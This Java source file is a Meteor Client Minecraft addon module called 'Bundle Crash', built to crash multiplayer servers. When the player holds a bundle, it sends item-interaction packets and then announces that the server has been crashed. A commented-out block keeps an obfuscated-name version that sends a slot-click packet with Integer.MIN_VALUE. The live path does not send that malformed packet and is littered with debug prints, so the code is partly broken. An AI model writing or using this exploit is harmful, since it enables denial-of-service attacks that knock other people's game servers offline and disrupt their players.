package com.example.addon.modules;





//import bundle.crash.mixin.client.ScreenAccessor;
//import net.fabricmc.api.ClientModInitializer;
//import net.fabricmc.api.EnvType;
//import net.fabricmc.api.Environment;
//import net.fabricmc.fabric.api.client.screen.v1.ScreenEvents;


//import net.minecraft.class_310;
//import net.minecraft.class_4185;
//import net.minecraft.class_490;


import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.item.BundleItem;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;


//import net.minecraft.class_1268;
//import net.minecraft.class_2561;
//import net.minecraft.class_2886;
//import net.minecraft.class_5537;
//import net.minecraft.class_9837;
public class BundleCrash extends Module {
    @Environment(EnvType.CLIENT)
    public BundleCrash(){
            super(AddonTemplate.CATEGORY, "Bundle Crash", "An crash module that crashes.");
    }
    MinecraftClient mc = MinecraftClient.getInstance();
    ClientPlayNetworkHandler handler = mc.getNetworkHandler();

    @Override
public void onActivate(){
        System.out.println("aktivny");
        if (mc.player != null && handler != null) {
            System.out.println("test2");
            if (!(mc.player.getMainHandStack().getItem() instanceof BundleItem)) {
                System.out.println("test3");
                mc.player.sendMessage(Text.literal("§cYou must be holding a bundle!"), false);
                mc.player.sendMessage(Text.literal("§cAlso make sure you have an item in the bundle!"), false);

            } else {
                System.out.println("test4");
                int slot = 36 + mc.player.getInventory().selectedSlot;
//                mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(slot, Integer.MIN_VALUE));
                System.out.println(slot+Integer.MIN_VALUE);
                mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0, mc.player.getYaw(), mc.player.getPitch()));
                mc.player.sendMessage(Text.literal("§aServer has been crashed!"), false);
            }
        }
    }

//    class_310 mc = class_310.method_1551();
//                        if (mc.field_1724 != null && mc.method_1562() != null) {
//        if (!(mc.field_1724.method_6047().method_7909() instanceof class_5537)) {
//            mc.field_1724.method_7353(class_2561.method_30163("§cYou must be holding a bundle!"), false);
//            mc.field_1724.method_7353(class_2561.method_30163("§cAlso make sure you have an item in the bundle!"), false);
//        } else {
//            int slot = 36 + mc.field_1724.method_31548().field_7545;
//            mc.method_1562().method_52787(new class_9837(slot, Integer.MIN_VALUE));
//            mc.method_1562().method_52787(new class_2886(class_1268.field_5808, 0, mc.field_1724.method_36454(), mc.field_1724.method_36455()));
//            mc.field_1724.method_7353(class_2561.method_30163("§aServer has been crashed!"), false);
//        }
//    }

}
